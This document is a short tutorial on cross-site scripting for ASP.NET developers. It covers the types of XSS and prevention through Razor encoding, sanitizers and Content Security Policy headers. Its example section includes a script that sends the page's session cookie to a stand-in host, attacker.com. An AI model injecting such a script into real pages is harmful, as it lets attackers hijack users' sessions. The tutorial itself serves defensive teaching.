# What is Cross-Site Scripting (XSS)?

XSS is a security vulnerability that allows an attacker to inject malicious JavaScript into your website — which then runs in another user’s browser.

## How Can XSS Harm Your Code?

Attackers use XSS to:

Attack Goal and	Result

- Steal session cookies    	|  Hijack user login, impersonate them
- Read or change page data	|  Display fake info or redirect to malicious site
- Exfiltrate user data	    |  Send user input or form data to attacker
- Inject fake forms/buttons	|  Perform phishing or force fake user actions

## Example of XSS Attack

Suppose you allow users to post comments and you render them without sanitizing input:

<p>@comment.Text</p>

User posts this:

```html
<script>alert('Hacked!');</script>
```
What Happens?

When another user opens the page, the script runs:

It shows an alert — or worse,

### Sends your session cookies to an attacker:

```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

# Types of XSS
Type	          |       Description
______________________________________________________________________________________

Stored XSS	    |   Malicious script is saved in the database and shown to users later
Reflected XSS	  |   Script is reflected in URL or form input and run immediately
DOM-based XSS	  |   JavaScript on the page dynamically injects malicious content into the DOM

# How to Prevent XSS

## In ASP.NET: Use Razor properly — It encodes by default:

<p>@Model.Comment</p>  ✅ safe -- encoding database inputs including java script
<p>@Html.Raw(Model.Comment)</p> ❌ dangerous unless you're 100% sure it's clean
Never trust user input (even if it's from a form, query string, etc.)

## Sanitize inputs using libraries like:

HtmlSanitizer
Built-in HTML encoding

## Use CSP headers (Content Security Policy):

If you intend to use CSP headers, never use inline JavaScript or CSS inside your HTML pages.
CSP blocks all inline styles and scripts by default.

Instead, you should:
- Move all JavaScript to external .js files
- Move all CSS to external .css files
- Only allow assets (scripts, styles, images, fonts, etc.) to be loaded from trusted sources using the CSP script-src, style-src, img-src, etc. directives.

This improves security by helping to prevent XSS (Cross-Site Scripting) attacks.

Content-Security-Policy: default-src 'self'; script-src 'self';

```csharp
app.Use(async (context, next) => 
{
    context.Response.Headers.Append("Content-Security-Policy", 
        "default-src 'self'; script-src 'self'");
    await next();
});

```